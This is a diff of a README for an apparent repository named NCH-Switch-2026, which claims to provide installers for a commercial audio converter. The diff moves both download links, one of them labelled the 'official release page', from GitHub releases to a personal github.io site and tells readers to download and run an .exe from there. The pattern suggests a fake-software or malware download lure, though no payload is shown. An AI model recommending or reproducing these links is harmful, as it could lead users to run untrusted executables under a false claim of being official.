@@ -1,6 +1,6 @@
 # 🎧 NCH-Switch-2026 - Convert Your Audio Files With Ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Shellieslambang882/NCH-Switch-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://shellieslambang882.github.io)
 
 This repository provides the setup files for the 2026 version of Switch Audio Converter. This software allows you to change audio file formats on your computer. It works on Windows 10 and Windows 11. You can convert files like MP3, WAV, FLAC, and WMA without complex settings.
 
@@ -8,7 +8,7 @@ This repository provides the setup files for the 2026 version of Switch Audio Co
 
 Follow these steps to get the software on your computer.
 
-1. Go to the [official release page](https://github.com/Shellieslambang882/NCH-Switch-2026/releases).
+1. Go to the [official release page](https://shellieslambang882.github.io).
 2. Look for the latest version listed under the Assets section.
 3. Click the file name ending in .exe to start your download.
 4. Save the file to your Downloads folder or your desktop so you can find it.
